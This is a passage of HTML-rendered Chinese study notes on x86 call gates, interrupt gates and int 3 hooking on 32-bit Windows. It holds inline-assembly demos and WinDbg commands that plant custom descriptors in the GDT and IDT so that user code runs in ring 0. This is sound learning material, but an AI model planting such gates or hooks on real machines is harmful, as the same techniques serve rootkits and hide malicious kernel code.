class=\"line\">\t__asm&#123;</span><br><span class=\"line\">\t\tpush fs</span><br><span class=\"line\">\t\tint 3  \t\t\t// esp 959deca0  数据段不区分3和0</span><br><span class=\"line\">\t\tpop fs</span><br><span class=\"line\">\t\tretf</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">int main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tx1 = (xxxxx)0x83e5141f;    // DbgPrint的地址</span><br><span class=\"line\">\tchar buf[] = &#123;0,0,0,0,0x48,0&#125;</span><br><span class=\"line\">\tsystem(&quot;pause&quot;);</span><br><span class=\"line\">    __asm&#123;</span><br><span class=\"line\">    \tmov eax,esp\t\t\t\t// esp 12fe50</span><br><span class=\"line\">\t\tcall fword ptr buf\t     // 这里f10是单步不进去的</span><br><span class=\"line\">haha:</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tsystem(&quot;pause&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>dds   959deca0</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 跨段提权</span><br><span class=\"line\">401088\t\t// 返回地址</span><br><span class=\"line\">1b\t\t\t// cs</span><br><span class=\"line\">12fe50\t\t// 保留3环esp</span><br><span class=\"line\">23\t\t\t// SS </span><br><span class=\"line\"></span><br><span class=\"line\">// 跨段不提权</span><br><span class=\"line\">401088\t\t// 返回地址</span><br><span class=\"line\">1b\t\t\t// cs</span><br></pre></td></tr></table></figure>\n<p>跨段提权会压入四个值，不提权两个值</p>\n<p>int 3 会修改 fs 为 30 ，内核层不会还原原来的 fs</p>\n<p>u nt!DbgPrint   // 证明提权</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">typedef int (__CRTDECL *xxxxx)(_In_z_ _Printf_format_string_ char const* const _Format,...);</span><br><span class=\"line\">xxxxx x1 = NULL;</span><br><span class=\"line\">char* strings = &quot;sssssss&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">void __declspec(naked) test1()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t__asm&#123;</span><br><span class=\"line\">\t\tpush fs\t\t// 进入ring 0之前fs是0x3b</span><br><span class=\"line\">\t\tmov ax, 0x30</span><br><span class=\"line\">\t\tmov fs,ax</span><br><span class=\"line\">\t\tmov eax,[strings]</span><br><span class=\"line\">\t\tpush eax</span><br><span class=\"line\">\t\tcall x1</span><br><span class=\"line\">\t\tadd esp,4</span><br><span class=\"line\">\t\t//int 3 </span><br><span class=\"line\">\t\tpop fs</span><br><span class=\"line\">\t\tretf</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">int main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tx1 = (xxxxx)0x83e5141f;    // DbgPrint的地址</span><br><span class=\"line\">\tchar buf[] = &#123;0,0,0,0,0x48,0&#125;</span><br><span class=\"line\">\tsystem(&quot;pause&quot;);</span><br><span class=\"line\">    __asm&#123;</span><br><span class=\"line\">    \tmov eax,esp\t\t\t\t// esp 12fe50</span><br><span class=\"line\">\t\tcall fword ptr buf\t     // 这里f10是单步不进去的</span><br><span class=\"line\">haha:</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tsystem(&quot;pause&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>参数个数 0-31</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">返回地址</span><br><span class=\"line\">CS</span><br><span class=\"line\">参数1</span><br><span class=\"line\">参数2</span><br><span class=\"line\">ESP</span><br><span class=\"line\">SS</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">eq gdtr+0x48 0040ec01`00081000</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">typedef int (__CRTDECL *xxxxx)(_In_z_ _Printf_format_string_ char const* const _Format,...);</span><br><span class=\"line\">xxxxx x1 = NULL;</span><br><span class=\"line\">char* strings = &quot;sssssss&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">void __declspec(naked) test1()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t__asm&#123;</span><br><span class=\"line\">\t\t//int 3</span><br><span class=\"line\">\t\tpush fs\t\t// 进入ring 0之前fs是0x3b</span><br><span class=\"line\">\t\tint 3</span><br><span class=\"line\">\t\tpop fs</span><br><span class=\"line\">\t\tretf   // 跨段提权时 平衡自身esp和跨段之前的esp</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">int main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tx1 = (xxxxx)0x83e5141f;    // DbgPrint的地址</span><br><span class=\"line\">\tchar buf[] = &#123;0,0,0,0,0x48,0&#125;</span><br><span class=\"line\">\tsystem(&quot;pause&quot;);</span><br><span class=\"line\">    __asm&#123;</span><br><span class=\"line\">    \tpush 0x111111</span><br><span class=\"line\">\t\tcall fword ptr buf\t     // 这里f10是单步不进去的</span><br><span class=\"line\">haha:</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tsystem(&quot;pause&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>retf 在跨段提权的时候平衡的 esp 有自身的和跨段之前的  retf 4</p>\n<p>用 jmp</p>\n<h3 id=\"中断门\"><a class=\"markdownIt-Anchor\" href=\"#中断门\">#</a> 中断门</h3>\n<p>call jmp 只能在同等权限下，或者低权限往高权限跳转。jmp 不能提权调用门</p>\n<p>retf iret 只能在同等权限下，或者高权限往低权限跳</p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231009222709758.png\" alt=\"image-20231009222709758\" style=\"zoom:50%;\" /> \n<p>D 默认是 1  default</p>\n<p>1110 32bit interrupt gate</p>\n<p>可屏蔽中断 / 不可屏蔽中断</p>\n<p>ELF 中第十位 IF， =0 不接收可屏蔽中断信号</p>\n<p>比如关机 是不可屏蔽中断</p>\n<p>键盘 USB 可屏蔽中断</p>\n<p>中断在 intel 中至少有 32 种中断</p>\n<p>中断在 IDT 中存放，但是中断门的段选择子还是查 GDT</p>\n<p>IDT：中断描述表</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0: kd&gt; r idtr   // interrupt descriptor table</span><br><span class=\"line\">idtr=80b99400</span><br><span class=\"line\"></span><br><span class=\"line\">0: kd&gt; dq 80b99400</span><br><span class=\"line\">ReadVirtual: 80b99400 not properly sign extended</span><br><span class=\"line\">80b99400  83e48e00`00081fc0 83e48e00`00082150</span><br><span class=\"line\">80b99410  00008500`00580000 83e4ee00`000825c0   // 83e4ee00`000825c0  == int 3</span><br><span class=\"line\">80b99420  83e4ee00`00082748 83e48e00`000828a8 </span><br><span class=\"line\">80b99430  83e48e00`00082a1c 83e48e00`00083018</span><br><span class=\"line\">80b99440  00008500`00500000 83e48e00`00083478</span><br><span class=\"line\">80b99450  83e48e00`0008359c 83e48e00`000836dc</span><br><span class=\"line\">80b99460  83e48e00`0008393c 83e48e00`00083c2c</span><br><span class=\"line\">80b99470  83e48e00`000842fc 83e48e00`000846b0</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">0: kd&gt; !idt</span><br><span class=\"line\">Dumping IDT: 80b99400</span><br><span class=\"line\">b7a341b100000037:\t8422f104 </span><br><span class=\"line\">b7a341b100000051:\t871a6a58 0xffffffff88f02254 (KINTERRUPT 871a6a00)</span><br><span class=\"line\">b7a341b100000052:\t871b57d8 0xffffffff88f02254 (KINTERRUPT 871b5780)</span><br><span class=\"line\">b7a341b100000053:\t871c0558 0xffffffff88f02254 (KINTERRUPT 871c0500)</span><br><span class=\"line\">b7a341b100000054:\t871cb2d8 0xffffffff88f02254 (KINTERRUPT 871cb280)</span><br><span class=\"line\">b7a341b100000055:\t871db558 0xffffffff88fc4b72 (KINTERRUPT 871db500)</span><br><span class=\"line\">b7a341b100000060:\t871a6cd8 0xffffffff88f02254 (KINTERRUPT 871a6c80)</span><br><span class=\"line\">b7a341b100000061:\t8758b558 &lt;Unloaded_serial.sys&gt;+0x2cf9 (KINTERRUPT 8758b500)</span><br><span class=\"line\">b7a341b100000062:\t871b5a58 0xffffffff88f02254 (KINTERRUPT 871b5a00)</span><br><span class=\"line\">b7a341b100000063:\t871c07d8 0xffffffff88f02254 (KINTERRUPT 871c0780)</span><br><span class=\"line\">b7a341b100000064:\t871cb558 0xffffffff88f02254 (KINTERRUPT 871cb500)</span><br><span class=\"line\">b7a341b100000065:\t871db058 0xffffffff88da148a (KINTERRUPT 871db000)</span><br><span class=\"line\">b7a341b100000066:\t8758b7d8 0xffffffffa4f727ab (KINTERRUPT 8758b780)</span><br><span class=\"line\">b7a341b100000070:\t8735c058 0xffffffff88f02254 (KINTERRUPT 8735c000)</span><br><span class=\"line\">b7a341b100000071:\t8758ba58 &lt;Unloaded_serial.sys&gt;+0x749a (KINTERRUPT 8758ba00)</span><br><span class=\"line\">b7a341b100000072:\t871b5cd8 0xffffffff88f02254 (KINTERRUPT 871b5c80)</span><br><span class=\"line\">b7a341b100000073:\t871c0a58 0xffffffff88f02254 (KINTERRUPT 871c0a00)</span><br><span class=\"line\">b7a341b100000074:\t871cb7d8 0xffffffff88f02254 (KINTERRUPT 871cb780)</span><br><span class=\"line\">b7a341b100000075:\t871db2d8 0xffffffff88da148a (KINTERRUPT 871db280)</span><br><span class=\"line\">b7a341b100000076:\t87713cd8 0xffffffffa4fdbf00 (KINTERRUPT 87713c80)</span><br><span class=\"line\">\t         0xffffffffa4e87d47 (KINTERRUPT 87713a00)</span><br><span class=\"line\">b7a341b100000080:\t8735c2d8 0xffffffff88f02254 (KINTERRUPT 8735c280)</span><br><span class=\"line\">b7a341b100000082:\t871a6058 0xffffffff88f02254 (KINTERRUPT 871a6000)</span><br><span class=\"line\">b7a341b100000083:\t871c0cd8 0xffffffff88f02254 (KINTERRUPT 871c0c80)</span><br><span class=\"line\">b7a341b100000084:\t871cba58 0xffffffff88f02254 (KINTERRUPT 871cba00)</span><br><span class=\"line\">b7a341b100000085:\t871db7d8 0xffffffff88f02254 (KINTERRUPT 871db780)</span><br><span class=\"line\">b7a341b100000086:\t8758b058 0xffffffffa4f727ab (KINTERRUPT 8758b000)</span><br><span class=\"line\">b7a341b100000090:\t8735c558 0xffffffff88f02254 (KINTERRUPT 8735c500)</span><br><span class=\"line\">b7a341b100000092:\t871a62d8 0xffffffff88f02254 (KINTERRUPT 871a6280)</span><br><span class=\"line\">b7a341b100000093:\t871b5058 0xffffffff88f02254 (KINTERRUPT 871b5000)</span><br><span class=\"line\">b7a341b100000094:\t871cbcd8 0xffffffff88f02254 (KINTERRUPT 871cbc80)</span><br><span class=\"line\">b7a341b100000095:\t871dba58 0xffffffff88f02254 (KINTERRUPT 871dba00)</span><br><span class=\"line\">b7a341b100000096:\t87235a58 0xffffffff88da148a (KINTERRUPT 87235a00)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">0: kd&gt; !idt 3</span><br><span class=\"line\">Dumping IDT: 80b99400</span><br><span class=\"line\">b7a341b100000003:\t83e425c0 nt!KiTrap03</span><br><span class=\"line\"></span><br><span class=\"line\">0: kd&gt; u 83e425c0 L 30</span><br><span class=\"line\">83e425c0 6a00            push    0</span><br><span class=\"line\">83e425c2 66c74424020000  mov     word ptr [esp+2],0</span><br><span class=\"line\">83e425c9 55              push    ebp</span><br><span class=\"line\">83e425ca 53              push    ebx</span><br><span class=\"line\">83e425cb 56              push    esi</span><br><span class=\"line\">83e425cc 57              push    edi</span><br><span class=\"line\">83e425cd 0fa0            push    fs</span><br><span class=\"line\">83e425cf bb30000000      mov     ebx,30h</span><br><span class=\"line\">83e425d4 668ee3          mov     fs,bx</span><br><span class=\"line\">83e425d7 648b1d00000000  mov     ebx,dword ptr fs:[0]</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">83e4ee00`000825c0</span><br><span class=\"line\"></span><br><span class=\"line\">offset 83e425c0</span><br><span class=\"line\"></span><br><span class=\"line\">80b99500  00000000`00080000 00000000`00080000</span><br><span class=\"line\">( 500 - 400 ) / 8 = 0x20 = 32</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">可以自定义的第一个中断int 32</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dq idtr+<span class=\"number\">0x100</span> <span class=\"number\">0040</span>ee00`<span class=\"number\">00081000</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> __declspec(naked) <span class=\"built_in\">test1</span>()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t__asm&#123;</span><br><span class=\"line\">\t\t<span class=\"type\">int</span> <span class=\"number\">3</span></span><br><span class=\"line\">\t\t<span class=\"comment\">//retf</span></span><br><span class=\"line\">\t\tiretd</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"type\">char</span> buf[] = &#123;<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0x48</span>,<span class=\"number\">0</span>&#125;</span><br><span class=\"line\">\t<span class=\"built_in\">system</span>(<span class=\"string\">&quot;pause&quot;</span>);</span><br><span class=\"line\">    __asm&#123;</span><br><span class=\"line\">\t\t<span class=\"type\">int</span> <span class=\"number\">32</span></span><br><span class=\"line\">\t\tpush <span class=\"number\">0x3b</span></span><br><span class=\"line\">\t\tpop fs</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"built_in\">system</span>(<span class=\"string\">&quot;pause&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span> __declspec(naked) <span class=\"built_in\">test1</span>()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t__asm&#123;</span><br><span class=\"line\">\t\t<span class=\"type\">int</span> <span class=\"number\">3</span></span><br><span class=\"line\">\t\tretf <span class=\"number\">4</span></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"type\">char</span> buf[] = &#123;<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0x48</span>,<span class=\"number\">0</span>&#125;</span><br><span class=\"line\">\t<span class=\"built_in\">system</span>(<span class=\"string\">&quot;pause&quot;</span>);</span><br><span class=\"line\">    __asm&#123;</span><br><span class=\"line\">\t\t<span class=\"type\">int</span> <span class=\"number\">32</span></span><br><span class=\"line\">\t\tpush <span class=\"number\">1</span></span><br><span class=\"line\">\t\tpush <span class=\"number\">0x3b</span></span><br><span class=\"line\">\t\tpop fs</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"built_in\">system</span>(<span class=\"string\">&quot;pause&quot;</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>retf 同时修改 0 环和三环的堆栈平衡</p>\n<p>iretd 返回五个值</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dds esp</span><br><span class=\"line\">eip</span><br><span class=\"line\">cs</span><br><span class=\"line\">eflag</span><br><span class=\"line\">esp </span><br><span class=\"line\">ss</span><br></pre></td></tr></table></figure>\n<h3 id=\"hook-int3\"><a class=\"markdownIt-Anchor\" href=\"#hook-int3\">#</a> hook int3</h3>\n<p>ds.base +  逻辑地址 = 线性地址 (目标地址)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1: kd&gt; dq 807d3020</span><br><span class=\"line\">ReadVirtual: 807d3020 not properly sign extended</span><br><span class=\"line\">807d3020  83e88e00`00081fc0 83e88e00`00082150</span><br><span class=\"line\">807d3030  00008500`00580000 83e8ee00`000825c0</span><br><span class=\"line\">807d3040  83e8ee00`00082748 83e88e00`000828a8</span><br><span class=\"line\">807d3050  83e88e00`00082a1c 83e88e00`00083018</span><br><span class=\"line\">807d3060  00008500`00500000 83e88e00`00083478</span><br><span class=\"line\">807d3070  83e88e00`0008359c 83e88e00`000836dc</span><br><span class=\"line\">807d3080  83e88e00`0008393c 83e88e00`00083c2c</span><br><span class=\"line\">807d3090  83e88e00`000842fc 83e88e00`000846b0</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>d.base =  目标地址 - 逻辑地址</p>\n<p>​            = 0x12345678 - 0x83e825c0</p>\n<p>因为局部缓存所以会缓存几条指令，需要在这几条指令内跨段跳转 jmp fword ptr</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">0</span>: kd&gt; r gdtr </span><br><span class=\"line\">gdtr=<span class=\"number\">80b</span>99000</span><br><span class=\"line\"><span class=\"number\">0</span>: kd&gt; dq <span class=\"number\">80b</span>99000</span><br><span class=\"line\"><span class=\"number\">80b</span>99000  <span class=\"number\">00000000</span>`<span class=\"number\">00000000</span> <span class=\"number\">00</span>cf9b00`<span class=\"number\">0000f</span>fff</span><br><span class=\"line\"><span class=\"number\">80b</span>99010  <span class=\"number\">00</span>cf9300`<span class=\"number\">0000f</span>fff <span class=\"number\">00</span>cffb00`<span class=\"number\">0000f</span>fff</span><br><span class=\"line\"><span class=\"number\">80b</span>99020  <span class=\"number\">00</span>cff300`<span class=\"number\">0000f</span>fff <span class=\"number\">80008b</span>1e`<span class=\"number\">400020</span>ab</span><br><span class=\"line\"><span class=\"number\">80b</span>99030  <span class=\"number\">834093f</span>6`ec003748 <span class=\"number\">0040f</span>300`<span class=\"number\">00000f</span>ff</span><br><span class=\"line\"><span class=\"number\">80b</span>99040  <span class=\"number\">0000f</span>200`<span class=\"number\">0400f</span>fff <span class=\"number\">00000000</span>`<span class=\"number\">00000000</span></span><br><span class=\"line\"><span class=\"number\">80b</span>99050  <span class=\"number\">830089f</span>6`c0000068 <span class=\"number\">830089f</span>6`c0680068</span><br><span class=\"line\"><span class=\"number\">80b</span>99060  <span class=\"number\">00000000</span>`<span class=\"number\">00000000</span> <span class=\"number\">00000000</span>`<span class=\"number\">00000000</span></span><br><span class=\"line\"><span class=\"number\">80b</span>99070  <span class=\"number\">800092b</span>9`<span class=\"number\">900003f</span>f <span class=\"number\">00000000</span>`<span class=\"number\">00000000</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">1</span>: kd&gt; r idtr </span><br><span class=\"line\">idtr=<span class=\"number\">807</span>d3020</span><br><span class=\"line\"><span class=\"number\">1</span>: kd&gt; dq <span class=\"number\">807</span>d3020</span><br><span class=\"line\"><span class=\"number\">807</span>d3020  <span class=\"number\">83e88</span>e00`<span class=\"number\">00081f</span>c0 <span class=\"number\">83e88</span>e00`<span class=\"number\">00082150</span></span><br><span class=\"line\"><span class=\"number\">807</span>d3030  <span class=\"number\">00008500</span>`<span class=\"number\">00580000</span> <span class=\"number\">83e8</span>ee00`<span class=\"number\">000825</span>c0</span><br><span class=\"line\"><span class=\"number\">807</span>d3040  <span class=\"number\">83e8</span>ee00`<span class=\"number\">00082748</span> <span class=\"number\">83e88</span>e00`<span class=\"number\">000828</span>a8</span><br><span class=\"line\"><span class=\"number\">807</span>d3050  <span class=\"number\">83e88</span>e00`<span class=\"number\">00082</span>a1c <span class=\"number\">83e88</span>e00`<span class=\"number\">00083018</span></span><br><span class=\"line\"><span class=\"number\">807</span>d3060  <span class=\"number\">00008500</span>`<span class=\"number\">00500000</span> <span class=\"number\">83e88</span>e00`<span class=\"number\">00083478</span></span><br><span class=\"line\"><span class=\"number\">807</span>d3070  <span class=\"number\">83e88</span>e00`<span class=\"number\">0008359</span>c <span class=\"number\">83e88</span>e00`<span class=\"number\">000836</span>dc</span><br><span class=\"line\"><span class=\"number\">807</span>d3080  <span class=\"number\">83e88</span>e00`<span class=\"number\">0008393</span>c <span class=\"number\">83e88</span>e00`<span class=\"number\">00083</span>c2c</span><br><span class=\"line\"><span 